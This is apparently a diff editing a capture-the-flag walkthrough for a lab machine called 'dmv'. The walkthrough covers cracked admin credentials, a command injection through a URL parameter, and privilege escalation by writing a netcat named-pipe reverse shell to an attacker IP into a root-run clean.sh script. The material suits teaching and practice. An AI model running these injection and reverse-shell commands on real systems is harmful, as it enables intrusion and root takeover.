@@ -381,15 +381,15 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Credentials:\
+Credentials:
 * User: **itsmeadmin**
 * Pass: **jessie**
 
 ### Login with Admin Credentials
 
 After login into `http://192.168.1.183/admin` with retrieved admin credentials, we found a "Clean Downloads" button.\
-When we press it, a `rm` command is exposed in URL as paramenter `c` content.
-So we found other RCE vector.
+When we press it, a `rm` command is exposed in URL as paramenter `c` content.\
+We just found other RCE vector.
 ```
 http://192.168.1.183/admin/?c=rm%20-rf%20/var/www/html/tmp/downloads
                             ^
@@ -405,7 +405,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data) Done :)
 
 ### Privilege Escalation
 
-Walking through the machine folders, we found a `/var/www/html/tmp` script that runs on every "Clean Downloads" interaction.\
+Walking through the machine folders, we found a `/var/www/html/tmp/clean.sh` script that runs on every "Clean Downloads" interaction.\
 To be able to remove `/var/www/html/tmp/downloads` folder, the `clean.sh` script must to run as root.\
 However, `www-data` user has write permission on it.
 ```
@@ -440,14 +440,14 @@ www-data@dmv:/var/www/html/tmp$ cat id.txt
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-So now I wrote the reverse shell connection in `clean.sh` to be ran as root.
+With the proven concept, I wrote the reverse shell connection in `clean.sh` to be ran as root.
 ```
 www-data@dmv:/var/www/html/tmp$ echo "mknod /tmp/backpipe3 p" > clean.sh
 www-data@dmv:/var/www/html/tmp$ echo "/bin/sh 0</tmp/backpipe3 | nc 192.168.1.189 4646 1>/tmp/backpipe3" >> clean.sh
 
 www-data@dmv:/var/www/html/tmp$ cat clean.sh
-mknod /tmp/backpipe p
-/bin/sh 0</tmp/backpipe | nc 192.168.1.189 4646 1>/tmp/backpipe
+mknod /tmp/backpipe3 p
+/bin/sh 0</tmp/backpipe3 | nc 192.168.1.189 4646 1>/tmp/backpipe3
 ```
 
 Listen `4646` port on my host machine.
